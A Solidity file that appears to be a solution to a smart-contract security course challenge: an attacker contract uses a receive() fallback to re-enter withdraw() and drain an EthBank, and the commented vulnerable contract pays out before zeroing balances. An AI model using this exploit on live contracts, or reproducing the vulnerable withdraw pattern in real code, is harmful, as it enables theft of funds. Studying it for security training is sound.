// SPDX-License-Identifier: MIT

// attacker contract
pragma solidity ^0.8;

interface IEthBank {
    function deposit() external payable;
    function withdraw() external payable;
}

contract EthBankExploit {
    IEthBank public bank;

    constructor(address _bank) {
        bank = IEthBank(_bank);
    }

    function pwn() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
    
    receive() external payable {
    if (address(bank).balance >= 1 ether) {
        bank.withdraw();
    }
}  
}

// https://www.smartcontract.engineer/challenges/solidity-re-entrancy?course=security

// vulnerable contract 

/*
pragma solidity 0.8.24;

contract EthBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external payable {
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "failed to send ETH");

        balances[msg.sender] = 0;
    }
}
*/